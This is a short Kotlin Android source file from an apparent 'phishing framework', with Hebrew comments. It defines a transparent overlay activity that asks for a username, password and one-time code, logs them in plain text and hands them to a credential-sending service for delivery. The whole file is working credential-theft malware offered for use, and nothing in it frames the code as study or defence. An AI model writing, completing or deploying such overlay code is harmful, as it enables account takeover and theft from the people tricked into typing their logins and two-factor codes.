package com.example.phishingframework

import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText

class PhishingOverlayActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // רקע שקוף
        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        // מקלדת + resize
        window.setSoftInputMode(
            WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                    WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
        )

        // ממשק הפישינג שלך
        setContentView(R.layout.phishing_login_overlay)

        val username = findViewById<EditText>(R.id.username_field)
        val password = findViewById<EditText>(R.id.password_field)
        val otp = findViewById<EditText>(R.id.otp_field)
        val loginButton = findViewById<Button>(R.id.login_button)

        loginButton.setOnClickListener {
            val user = username.text.toString()
            val pass = password.text.toString()
            val code = otp.text.toString()

            Log.d("PhishingOverlay", "user=$user pass=$pass otp=$code")

            // שליחה לשרת או קוד קיים:
            val intent = Intent(this, CredentialSendService::class.java).apply {
                putExtra("username", user)
                putExtra("password", pass)
                putExtra("otp", code)
            }
            startService(intent)

            finish()
        }

        username.requestFocus()
    }
}
